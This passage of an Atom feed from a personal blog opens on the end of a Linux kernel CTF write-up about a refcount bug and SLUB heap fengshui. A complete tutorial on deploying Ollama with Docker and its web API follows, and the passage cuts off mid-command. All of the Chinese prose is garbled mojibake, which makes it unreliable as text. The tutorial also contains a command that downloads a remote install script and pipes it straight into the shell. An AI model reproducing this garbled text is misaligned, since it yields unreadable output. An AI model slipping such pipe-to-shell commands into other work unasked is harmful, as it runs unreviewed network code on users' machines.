¸æ¨¡å—ï¼Œä½ ä¼šæ³¨æ„åˆ°æˆ‘åœ¨è®¡ç®— <code>vm_area</code> çš„å¼•ç”¨è®¡æ•°ä¸Šå†™äº†å¦ä¸€ä¸ªéé¢„æœŸæ¼æ´ï¼š <strong>æˆ‘å¿˜äº†å†™ vm_open() ä»¥æ·»åŠ å¼•ç”¨è®¡æ•°ï¼Œä½†ä»è®°å¾—å†™ vm_close() ä»¥å‡å°‘å¼•ç”¨è®¡æ•°ï¼</strong> è¿™è¿·æƒ‘äº†ä¸å°‘é€‰æ‰‹å¹¶è®©ä»–ä»¬æµªè´¹äº†å¾ˆå¤šæ—¶é—´å°è¯•åˆ©ç”¨è¿™ä¸ªæ¼æ´ï¼Œå› ä¸ºå®é™…ä¸Šå…¶å¹¶ä¸å¥½åˆ©ç”¨ï¼Œå› ä¸ºé¡µé¢å¾ˆéš¾è¢«åŒæ—¶ç”¨ä½œç”¨æˆ·æ˜ å°„é¡µé¢ä¸ SLUB é¡µé¢ï¼ˆä½†å¦‚æœä½ è¶³å¤Ÿæ„Ÿå…´è¶£ï¼Œæˆ–è®¸ä½ å¯ä»¥çœ‹çœ‹ <a href="https://github.com/arttnba3/Linux-kernel-exploitation/tree/main/CVE/CVE-2024-0582">CVE-2024-0582</a> ï¼Œå…¶æƒ…å†µä¸ä¹‹ç›¸ä¼¼ï¼Œä½†æˆ‘ä¸ç¡®å®šè¿™å¯¹ <code>d3kshrm</code> æ˜¯å¦åŒæ ·æœ‰ç”¨ï¼Œæ‰€ä»¥ç¥ä½ å¥½è¿ï¼‰ï¼Œæˆ‘éå¸¸æŠ±æ­‰å› ä¸ºè¿™é“é¢˜å‡ºå¾—å¤ªèµ¶äº†æˆ‘æ²¡æœ‰ä»”ç»†æ£€æŸ¥</p><p>ä»æ•´åœºæ¯”èµ›è€Œè¨€ï¼Œä»…æœ‰æ¥è‡ª <a href="https://ctftime.org/team/19208/">MNGA</a> æˆ˜é˜Ÿçš„ <code>Tplus</code> é€‰æ‰‹æˆåŠŸä»¥é¢„æœŸè§£æ³•è§£å‡ºäº†è¿™é“é¢˜ï¼Œ<strong>è®©æˆ‘ä»¬ç¥è´ºè¿™ä½å”¯ä¸€åœ¨æ¯”èµ›æœŸé—´ä»¥é¢„æœŸè§£è§£å‡ºè¿™é“é¢˜çš„é€‰æ‰‹ï¼</strong> è€Œæ¥è‡ª <a href="https://wm-team.cn/">W&amp;M</a> çš„ <a href="https://9anux.org/2025/06/02/d3kshrm/">Qanux</a> é€‰æ‰‹åœ¨æ¯”èµ›ç»“æŸåä¹ŸåŒæ ·ä»¥é¢„æœŸè§£æ³•è§£å‡ºäº†è¿™é“é¢˜ç›®ï¼ˆå› ä¸ºä»–æ²¡æƒ³åˆ°è¿˜æœ‰ä¸ª <code>-revenge</code> ç‰ˆæœ¬ä»è€Œåœ¨ç”¨éé¢„æœŸè§£å¾—åˆ†åä¾¿å‡ºå»åƒå¤§é¤äº†ï¼‰ï¼Œæ— è®ºå¦‚ä½•æˆ‘è®¤ä¸ºæˆ‘ä»¬éƒ½åº”å½“ä¸ºä»–ä»¬é¼“æŒä¸åº†è´º</p><p>å¦ä¸€ä¸ªæœ‰è¶£çš„ç‚¹æ˜¯ä½ ä»¬æˆ–è®¸ä¼šå¿½è§† <strong>åœ¨ kmem_cache è¢«åˆ›å»ºæ—¶ä¾¿ä¼šåˆ†é…ä¸€ä»½æ–°çš„ SLUB é¡µé¢</strong> ï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬çš„å †é£æ°´åº”å½“å…³æ³¨äº <strong>ä¸‹ä¸€ä¸ªæ–°åˆ†é…çš„ SLUB é¡µé¢</strong> ï¼Œæˆ‘è®¤ä¸ºè¿™æ˜¯ <code>Tplus</code> é€‰æ‰‹ä¸ <code>Qanux</code> é€‰æ‰‹æ‰€è‡ªè¡Œç¼–å†™çš„é¢„æœŸè§£æ³•çš„æˆåŠŸç‡è¾ƒä½çš„ç¼˜æ•…ï¼šä»–ä»¬å…³æ³¨äºç¬¬ä¸€ä»½ SLUBï¼Œè€Œæˆ‘çš„å®˜æ–¹è§£æ³•å…³æ³¨äºç¬¬äºŒä»½ SLUBï¼Œå› æ­¤æˆ‘çš„æˆåŠŸåˆ©ç”¨é¡µçº§å †é£æ°´çš„æ¦‚ç‡è¶…è¿‡ <code>80%</code> ä¸”åœ¨æ‰“è¿œç¨‹æ—¶æ— éœ€çˆ†ç ´</p><p>å°½ç®¡å…³äº Linux kernel exploitation ç¬”è€…è¿˜æœ‰å¾ˆå¤šæƒ³è¯´çš„è¯ï¼Œä½†ä¼¼ä¹å†™åˆ°è¿™é‡Œçš„æ—¶å€™æ–‡ç« å·²ç»å¤ªé•¿äº†ï¼Œé‚£ä¹ˆå°±è®©æˆ‘ä»¬å°±æ­¤æ‰“ä½å§ï¼Œæ— è®ºå¦‚ä½•æˆ‘è¦æ„Ÿè°¢æ¯ä¸€ä½å‚åŠ äº†è¿™ä¸ª CTF å¹¶å°è¯•è¿›è¡Œè§£é¢˜çš„é€‰æ‰‹ï¼Œæ— è®ºä½ ä»¬æ˜¯å¦è·å¾—äº† flag</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;ã€Šç«æ˜Ÿæ•‘æ´ä¹‹ä¼é¹…ç”·å­©ä¸ç¾äººa3æˆ˜å£«ä¸éé¢„æœŸè§£ã€‹&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://arttnba3.github.io/categories/CTF/"/>
    
    
    <category term="Linux" scheme="https://arttnba3.github.io/tags/Linux/"/>
    
    <category term="Linux Kernel" scheme="https://arttnba3.github.io/tags/Linux-Kernel/"/>
    
    <category term="ä¿¡æ¯å®‰å…¨" scheme="https://arttnba3.github.io/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    <category term="Pwn" scheme="https://arttnba3.github.io/tags/Pwn/"/>
    
    <category term="CTF" scheme="https://arttnba3.github.io/tags/CTF/"/>
    
    <category term="D^3CTF" scheme="https://arttnba3.github.io/tags/D-3CTF/"/>
    
    <category term="Heap Overflow" scheme="https://arttnba3.github.io/tags/Heap-Overflow/"/>
    
    <category term="Cross-Cache Overflow" scheme="https://arttnba3.github.io/tags/Cross-Cache-Overflow/"/>
    
    <category term="å †é£æ°´" scheme="https://arttnba3.github.io/tags/%E5%A0%86%E9%A3%8E%E6%B0%B4/"/>
    
    <category term="Page-level Heap Fengshui" scheme="https://arttnba3.github.io/tags/Page-level-Heap-Fengshui/"/>
    
  </entry>
  
  <entry>
    <title>ã€OPS.0x06ã€‘ä½¿ç”¨ Ollama æœ¬åœ°éƒ¨ç½²è½»é‡LLM</title>
    <link href="https://arttnba3.github.io/2025/05/31/OPS-0X06-DEPLOY_OLLAMA/"/>
    <id>https://arttnba3.github.io/2025/05/31/OPS-0X06-DEPLOY_OLLAMA/</id>
    <published>2025-05-30T18:17:33.000Z</published>
    <updated>2025-07-03T14:47:11.733Z</updated>
    
    <content type="html"><![CDATA[<p>ç¾Šé©¼ï¼šä¼šè€…ä¸éš¾</p><span id="more"></span><h1 id="0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰"><a href="#0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰" class="headerlink" title="0x00. ä¸€åˆ‡å¼€å§‹ä¹‹å‰"></a>0x00. ä¸€åˆ‡å¼€å§‹ä¹‹å‰</h1><p>ä¼—æ‰€å‘¨çŸ¥æœ€è¿‘è¿™å‡ å¹´å¤§è¯­è¨€æ¨¡å‹æŒºç«çš„ï¼ŒåŒ…æ‹¬ä»Šå¹´å¹´åˆ DeepSeek-R1 çš„çˆ†ç«ä¹Ÿè®©åŒæ˜¯åäººçš„ç¬”è€…æ„Ÿåˆ°è‡ªè±ªï¼ˆæ¯•ç«Ÿ DeepSeek å›¢é˜Ÿæ˜¯â€œå…¨åç­â€ï¼‰ï¼Œå½“ç„¶æ›´å¤šçš„é—²è¯åœ¨è¿™é‡Œç»§ç»­çæ‰¯æ²¡å•¥æ„ä¹‰ï¼Œæ€»è€Œè¨€ä¹‹ç¬”è€…ä¹Ÿæƒ³åœ¨æœ¬åœ°è‡ªå·±éƒ¨ç½²ä¸€äº›è½»é‡çº§çš„ LLM ç©ä¸€ç©ï¼ŒåŒ…æ‹¬ DeepSeekã€QWEN ä¹‹ç±»çš„ï¼Œçœ‹äº†ä¸€åœˆå‘ç° Ollama æ–¹æ¡ˆè¿˜æ˜¯æŒºæ–¹ä¾¿çš„ï¼Œå› æ­¤ç®€å•å†™ä¸€ç¯‡åšå®¢è®²è®²æ€ä¹ˆä½¿ç”¨ Ollama è‡ªè¡Œéƒ¨ç½² LLM</p><h1 id="0x01-å®‰è£…å¹¶ä½¿ç”¨-Ollama"><a href="#0x01-å®‰è£…å¹¶ä½¿ç”¨-Ollama" class="headerlink" title="0x01. å®‰è£…å¹¶ä½¿ç”¨ Ollama"></a>0x01. å®‰è£…å¹¶ä½¿ç”¨ Ollama</h1><p>Ollama æ˜¯ä¸€ä¸ªèƒ½å¤Ÿéå¸¸æ–¹ä¾¿åœ°åœ¨æœ¬åœ°éƒ¨ç½²å¤§æ¨¡å‹çš„è½¯ä»¶ï¼Œæä¾›äº†åŒ…æ‹¬æ¨¡å‹ä¸‹è½½ä¸ç®¡ç†ã€API ç­‰åŠŸèƒ½ï¼Œæœ¬èŠ‚æˆ‘ä»¬ç®€å•è®²è¿°å¦‚ä½•å®‰è£…ä¸ä½¿ç”¨ Ollama</p><p><img src="https://s2.loli.net/2025/02/18/NSUydrO6vWqsjXH.png"></p><blockquote><p>æ³¨ï¼šä¸åŒ…å« Windows æˆ– FreeBSD ç­‰å…¶ä»–æ“ä½œç³»ç»Ÿçš„æ–¹æ¡ˆï¼Œå› ä¸ºç¬”è€…ä¸ç”¨è¿™äº›ç³»ç»Ÿï¼šï¼ˆ</p></blockquote><h2 id="æ–¹æ³•ä¸€ï¼šä½¿ç”¨-Docker-è¿›è¡Œéƒ¨ç½²ï¼ˆæ¨èï¼‰"><a href="#æ–¹æ³•ä¸€ï¼šä½¿ç”¨-Docker-è¿›è¡Œéƒ¨ç½²ï¼ˆæ¨èï¼‰" class="headerlink" title="æ–¹æ³•ä¸€ï¼šä½¿ç”¨ Docker è¿›è¡Œéƒ¨ç½²ï¼ˆæ¨èï¼‰"></a>æ–¹æ³•ä¸€ï¼šä½¿ç”¨ Docker è¿›è¡Œéƒ¨ç½²ï¼ˆæ¨èï¼‰</h2><p>ä¼—æ‰€å‘¨çŸ¥å‰é¢å¿˜äº†ä¸­é—´å¿˜äº†åé¢ä¹Ÿå¿˜äº†ï¼Œæ€»è€Œè¨€ä¹‹ä½¿ç”¨ Docker ç­‰å¸¦éš”ç¦»æœºåˆ¶çš„å·¥å…·è¿›è¡Œéƒ¨ç½²é€šå¸¸æ˜¯æ›´åŠ å®‰å…¨çš„è§£å†³æ–¹æ¡ˆ</p><p>é¦–å…ˆå°† ollama å®˜æ–¹çš„ docker é•œåƒæ‹‰åˆ°æœ¬åœ°ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker pull ollama/ollama</span><br></code></pre></td></tr></table></figure><p>ç„¶åå°±èƒ½ç›´æ¥ä½¿ç”¨äº†ï¼Ÿç­”æ¡ˆæ˜¯è‚¯å®šçš„ä¹Ÿæ˜¯å¦å®šçš„ï¼Œè™½ç„¶å¯ä»¥ç›´æ¥ç”¨ CPU æ¥è¿è¡Œæœ¬åœ°æ¨¡å‹ï¼Œä½†æ˜¯å¾ˆæ˜æ˜¾ç”¨ GPU è·‘æ˜¯æ›´å¿«çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬æ¥ä¸‹æ¥è¿˜éœ€è¦å°†æ˜¾å¡æ¥å…¥åˆ°å®¹å™¨å½“ä¸­</p><blockquote><p>å¦‚æœä½ æ‰‹ä¸Šåˆšå¥½æ²¡æœ‰æ˜¾å¡ï¼Œæˆ–è€…ä½ æƒ³åªç”¨ CPU æ¥è·‘æœ¬åœ°æ¨¡å‹ï¼Œä½ ä¹Ÿå¯ä»¥ç›´æ¥åˆ›å»ºä¸€ä¸ªå®¹å™¨æ¥è¿è¡Œï¼šï¼‰</p></blockquote><h3 id="ä¸º-NVIDIA-GPU-è¿›è¡Œé…ç½®"><a href="#ä¸º-NVIDIA-GPU-è¿›è¡Œé…ç½®" class="headerlink" title="ä¸º NVIDIA GPU è¿›è¡Œé…ç½®"></a>ä¸º NVIDIA GPU è¿›è¡Œé…ç½®</h3><p><a href="https://docs.nvidia.com/datacenter/cloud-native/container-toolkit/latest/index.html">NVIDIA Container Toolkit</a> æ˜¯ NVIDIA å¼€å‘çš„èƒ½å¤Ÿè®©ç”¨æˆ·æ„å»ºèƒ½ä½¿ç”¨ GPU çš„å®¹å™¨çš„å·¥å…·åŒ…ï¼Œä¸ºäº†åœ¨å®¹å™¨å½“ä¸­ä½¿ç”¨ GPUï¼Œæˆ‘ä»¬é¦–å…ˆéœ€è¦å®‰è£…è¿™ä¸€å·¥å…·åŒ…</p><p><img src="https://s2.loli.net/2023/08/31/dWpAu8LJQ2bOShg.png" alt="image.png"></p><p>åœ¨ <a href="https://arttnba3.cn/2023/08/31/OPS-0X00-DOCKER_ON_SERVER/">è¿™ç¯‡åšå®¢</a> å½“ä¸­ç¬”è€…å·²ç»è®²è¿°äº†å¦‚ä½•å®‰è£…å¹¶ä½¿ç”¨ NVIDIA Container Toolkit å°†æ˜¾å¡æŒ‚è½½åˆ°å®¹å™¨å½“ä¸­ï¼Œè¿™é‡Œæˆ‘ä»¬å°±ç®€å•å™è¿°ä¸€ä¸‹å¦‚ä½•åœ¨ SUSE ç³»çš„ Linux å‘è¡Œç‰ˆä¸Šå®Œæˆè¿™ä»¶äº‹ï¼Œé¦–å…ˆæˆ‘ä»¬éœ€è¦æ·»åŠ  NVIDIA çš„ä»“åº“ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo zypper ar https://nvidia.github.io/libnvidia-container/stable/rpm/nvidia-container-toolkit.repo</span><br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥å®‰è£… NVIDIA Container Toolkitï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo zypper --gpg-auto-import-keys install -y nvidia-container-toolkit</span><br></code></pre></td></tr></table></figure><blockquote><p>å¦‚æœä½ ä½¿ç”¨çš„æ˜¯ Gentoo ç³»ç»Ÿï¼Œå¯ä»¥ç›´æ¥å®‰è£…ç¤¾åŒºç§»æ¤åˆ° Gentoo ä»“åº“é‡Œçš„åŒ…ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo emerge -av app-containers/nvidia-container-toolkit</span><br></code></pre></td></tr></table></figure></blockquote><p>ç„¶åé…ç½® container runtimeï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo nvidia-ctk runtime configure --runtime=docker</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo systemctl restart docker</span><br></code></pre></td></tr></table></figure><p>æœ€åå¯åŠ¨ä¸€ä¸ªå¸¦ GPU çš„ Ollama å®¹å™¨ï¼Œä¸ºäº†æ–¹ä¾¿è¿™é‡Œç›´æ¥ä¸æœ¬åœ°å…±ç”¨ç½‘ç»œï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker run -d --network=host --gpus=all -v ollama:/root/.ollama --name ollama ollama/ollama</span><br></code></pre></td></tr></table></figure><blockquote><p>å¦‚æœä½ çš„æœºå™¨ä¸Šæœ‰å¤šå¼  GPUï¼Œè€Œä½ æƒ³è®©ä½ çš„å®¹å™¨åªä½¿ç”¨å…¶ä¸­æŸä¸€å¼ ï¼Œå¯ä»¥å°† <code>--gpus=all</code> æ”¹ä¸º <code>--gpus=&#39;&quot;device=æ˜¾å¡æ ‡å·&quot;&#39;</code> è¿›è¡ŒæŒ‡å®šï¼Œå…¶ä¸­æ˜¾å¡æ ‡å·ä¸ºä½¿ç”¨ <code>nvidia-smi</code> æŒ‡ä»¤æ‰€è·å–çš„å·ç </p></blockquote><p>Ollama daemon é»˜è®¤ä¼šä½¿ç”¨ <code>11434</code> ç«¯å£æä¾› APIï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥å°†è¿™ä¸ªç«¯å£æ˜ å°„å‡ºæ¥ä½¿ç”¨ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker run -d --gpus=all -v ollama:/root/.ollama -p 11434:11434 --name ollama ollama/ollama</span><br></code></pre></td></tr></table></figure><p>ç®€å•æ‹‰ä¸€ä¸ªæ¨¡å‹æµ‹è¯•çœ‹çœ‹æ•ˆæœï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker <span class="hljs-built_in">exec</span> -it ollama ollama pull llama3.2</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">curl http://localhost:11434/api/chat -d <span class="hljs-string">&#x27;&#123;</span></span><br>  &quot;model&quot;: &quot;llama3.2&quot;,<br>  &quot;messages&quot;: [<br>    &#123; &quot;role&quot;: &quot;user&quot;, &quot;content&quot;: &quot;ä½ å¥½æˆ‘æ˜¯ä¸çœŸ&quot; &#125;<br>  ]<br>&#125;&#x27;<br></code></pre></td></tr></table></figure><p>æˆåŠŸè¿è¡Œï¼Œä¸è¿‡è¿”å›ç»“æœçš„æ ¼å¼ç¨å¾®æœ‰äº›æŠ½è±¡ï¼š</p><p><img src="https://s2.loli.net/2025/02/18/V9lwj2XGtuOBNkY.png"></p><p>å½“ç„¶ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡å‘½ä»¤è¡Œä¸ Ollama è¿›è¡Œäº¤äº’ï¼Œåªéœ€è¦è¿è¡Œå¦‚ä¸‹å‘½ä»¤è¿›å…¥äº¤äº’ç•Œé¢ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker <span class="hljs-built_in">exec</span> -it ollama ollama run llama3.2</span><br></code></pre></td></tr></table></figure><p>ç„¶åå°±æ˜¯ä¸€ä¸ªäº¤äº’å¼çš„èŠå¤©ç•Œé¢äº†ï¼Œå¯ä»¥è¾“å…¥ <code>/bye</code> é€€å‡ºï¼š</p><p><img src="https://s2.loli.net/2025/03/12/dN5hUr2AKYn8pt7.png"></p><h3 id="ä¸º-AMD-GPU-è¿›è¡Œé…ç½®ï¼ˆğŸ•Šï¼‰"><a href="#ä¸º-AMD-GPU-è¿›è¡Œé…ç½®ï¼ˆğŸ•Šï¼‰" class="headerlink" title="ä¸º AMD GPU è¿›è¡Œé…ç½®ï¼ˆğŸ•Šï¼‰"></a>ä¸º AMD GPU è¿›è¡Œé…ç½®ï¼ˆğŸ•Šï¼‰</h3><p>ç¬”è€…æ‰‹ä¸Šæ²¡æœ‰ AMD çš„ GPUï¼ˆçŸ­æœŸå†…å¤§æ¦‚ç‡åº”è¯¥ä¹Ÿä¸ä¼šä¹Ÿæ²¡é’±ä¹°ï¼‰ï¼Œæ‰€ä»¥è¿™ä¸€èŠ‚å…ˆç©ºç€ğŸ•ŠğŸ•ŠğŸ•ŠğŸ•ŠğŸ•ŠğŸ•Š</p><blockquote><p>æŒ‰ç…§ <a href="http://hub.docker.com/r/ollama/ollama">Ollama Docker</a> çš„æ–‡æ¡£ï¼Œå¯ä»¥è¿è¡Œå¦‚ä¸‹å‘½ä»¤åˆ›å»ºå¸¦ AMD GPU çš„å®¹å™¨ï¼Œä¸è¿‡ç¬”è€…æ²¡æœ‰è¯•è¿‡ï¼Œæ‰€ä»¥ä¸ä¿çœŸï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker run -d --device /dev/kfd --device /dev/dri -v ollama:/root/.ollama -p 11434:11434 --name ollama ollama/ollama:rocm</span><br></code></pre></td></tr></table></figure></blockquote><h2 id="æ–¹æ³•äºŒï¼šç›´æ¥å°†-Ollama-å®‰è£…åˆ°æœ¬åœ°"><a href="#æ–¹æ³•äºŒï¼šç›´æ¥å°†-Ollama-å®‰è£…åˆ°æœ¬åœ°" class="headerlink" title="æ–¹æ³•äºŒï¼šç›´æ¥å°† Ollama å®‰è£…åˆ°æœ¬åœ°"></a>æ–¹æ³•äºŒï¼šç›´æ¥å°† Ollama å®‰è£…åˆ°æœ¬åœ°</h2><p>ç¬”è€…æ¯”è¾ƒæ¨èçš„æ˜¯é€šè¿‡å‘è¡Œç‰ˆå¯¹åº”çš„åŒ…ç®¡ç†å™¨è¿›è¡Œå®‰è£…ï¼Œä¾‹å¦‚ç¬”è€…çš„æœåŠ¡å™¨ä½¿ç”¨çš„æ˜¯ openSUSE Tumbleweedï¼Œç›´æ¥é€šè¿‡ zypper å®‰è£…å³å¯ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo zypper <span class="hljs-keyword">in</span> ollama</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo systemctl <span class="hljs-built_in">enable</span> --now ollama</span><br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡å®˜ç½‘çš„å®‰è£…è„šæœ¬å°† Ollama ç›´æ¥å®‰è£…åˆ°æœ¬åœ°ï¼Œåªéœ€è¦è¿è¡Œï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">curl -fsSL https://ollama.com/install.sh | sh</span><br></code></pre></td></tr></table></figure><blockquote><p>éœ€è¦æ³¨æ„çš„æ˜¯è¿™ä¸ªæ–¹å¼å®‰è£…çš„ Ollama ä¼šç›´æ¥å®‰è£…åˆ° <code>/usr/local/bin/lib/ollama</code> æˆ–æ˜¯å…¶ä»–ç±»ä¼¼è·¯å¾„ï¼Œç„¶åä¼šç›´æ¥åˆ é™¤æ—§ ollama çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œéå¸¸ä¸ä¼˜é›…ä¹Ÿä¸å—åŒ…ç®¡ç†å™¨ç®¡æ§ï¼Œç¬”è€…ä¸å¤ªå–œæ¬¢ï¼šï¼ˆ</p></blockquote><p>ä¹‹åå°±èƒ½ç›´æ¥ä½¿ç”¨ ollama äº†ï¼Œè¿™é‡Œè¿˜æ˜¯ç®€å•éšä¾¿æµ‹è¯•ä¸€ä¸ªæ¨¡å‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">ollama pull llama3.2</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">curl http://localhost:11434/api/chat -d <span class="hljs-string">&#x27;&#123;</span></span><br>  &quot;model&quot;: &quot;llama3.2&quot;,<br>  &quot;messages&quot;: [<br>    &#123; &quot;role&quot;: &quot;user&quot;, &quot;content&quot;: &quot;ä½ å¥½æˆ‘ä¸æ˜¯ä¸çœŸ&quot; &#125;<br>  ]<br>&#125;&#x27;<br></code></pre></td></tr></table></figure><p>LLAMA3.2 çš„å›ç­”å¹½é»˜ç¨‹åº¦è¶…å‡ºç¬”è€…æƒ³è±¡ï¼š</p><p><img src="https://s2.loli.net/2025/02/18/8CiYecmusFAN3aO.png"></p><h2 id="Example-éƒ¨ç½²-DeepSeek"><a href="#Example-éƒ¨ç½²-DeepSeek" class="headerlink" title="Example. éƒ¨ç½² DeepSeek"></a>Example. éƒ¨ç½² DeepSeek</h2><p>æ„Ÿè§‰å…¶å®æ²¡å•¥å¥½è®²çš„ï¼Œç›´æ¥ç”¨ Ollama æ‹‰åˆ°æœ¬åœ°å°±è¡Œï¼Œè¿™é‡Œæ³¨æ„æ ¹æ®è‡ªå·±éœ€æ±‚å†³å®šæ‹‰çš„ç‰ˆæœ¬çš„å‚æ•°æ•°é‡ï¼Œç¬”è€…æœ¬åœ°çš„æ˜¾å¡åªæœ‰ 6G æ‰€ä»¥å…ˆæ‹‰ä¸€ä¸ª 7B ç‰ˆæœ¬çš„ DeepSeek-R1 è¯•è¯•æ°´ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">ollama pull deepseek-r1:7b</span><br></code></pre></td></tr></table></figure><p>è¿˜æ˜¯ç®€å•æµ‹è¯•ä¸€ä¸‹ï¼Œæ„Ÿè§‰å›ç­”æ²¡æœ‰åˆšåˆš LLAMA3.2 çµå…‰ä¸€é—ªçš„é‚£ä¹ˆå¹½é»˜ï¼š</p><p><img src="https://s2.loli.net/2025/02/18/qvgJwxFi1N9AkZa.png"></p><h1 id="0x02-é€šè¿‡-Web-API-ä¸-Ollama-è¿›è¡Œäº¤äº’"><a href="#0x02-é€šè¿‡-Web-API-ä¸-Ollama-è¿›è¡Œäº¤äº’" class="headerlink" title="0x02. é€šè¿‡ Web API ä¸ Ollama è¿›è¡Œäº¤äº’"></a>0x02. é€šè¿‡ Web API ä¸ Ollama è¿›è¡Œäº¤äº’</h1><p>é™¤äº†ç›´æ¥é€šè¿‡ shell ä¸ Ollama cli èŠå¤©ä»¥å¤–ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡ Web API ä¸ Ollama è¿›è¡Œäº¤äº’ï¼ŒOllama çš„åŸºæœ¬æ¶æ„å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œå…¶æä¾›äº†ä¸€ä¸ª HTTP Server ä¾›æˆ‘ä»¬è¿›è¡Œ HTTP è¯·æ±‚ï¼š</p><p><img src="https://s2.loli.net/2025/03/12/zHIKOY2BFACjDWy.png"></p><p>å¯¹äºéƒ¨ç½²åœ¨æœ¬åœ°çš„ Ollamaï¼Œå…¶ Web ç«¯å£é€šå¸¸å¼€æ”¾äº <code>11434</code> ï¼Œæˆ‘ä»¬é€šå¸¸åº”å½“æäº¤ POST è¯·æ±‚ï¼Œä¸‹é¢æˆ‘ä»¬çœ‹ä¸€äº›å¸¸è§çš„ API ä¸ä¾‹å­</p><h2 id="é€šè¿‡-api-generate-è¿›è¡Œç®€æ˜“äº¤äº’"><a href="#é€šè¿‡-api-generate-è¿›è¡Œç®€æ˜“äº¤äº’" class="headerlink" title="é€šè¿‡ &#x2F;api&#x2F;generate è¿›è¡Œç®€æ˜“äº¤äº’"></a>é€šè¿‡ &#x2F;api&#x2F;generate è¿›è¡Œç®€æ˜“äº¤äº’</h2><p><code>/api/generate</code> æ˜¯ä¸€ä¸ªç®€æ˜“çš„äº¤äº’æ¥å£ï¼Œç”¨æˆ·å¯ä»¥é€šè¿‡è¯¥æ¥å£æä¾›æç¤ºè¯è®©å…¶ç”Ÿæˆå•æ¡å›å¤ï¼Œæˆ‘ä»¬åº”å½“ä¼ å…¥å¦‚ä¸‹æ ¼å¼ JSON æ•°æ®ä½œä¸ºè¾“å…¥ï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;model&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;æ¨¡å‹å&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;prompt&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ä½ çš„åˆå§‹æç¤ºè¯&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>ä»¥ä¸‹æ˜¯ä¸€ä¸ªç®€æ˜“çš„ä¾‹å­ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">curl http://localhost:11434/api/generate -d <span class="hljs-string">&#x27;&#123;</span></span><br>  &quot;model&quot;: &quot;deepseek-r1:7b&quot;,<br>  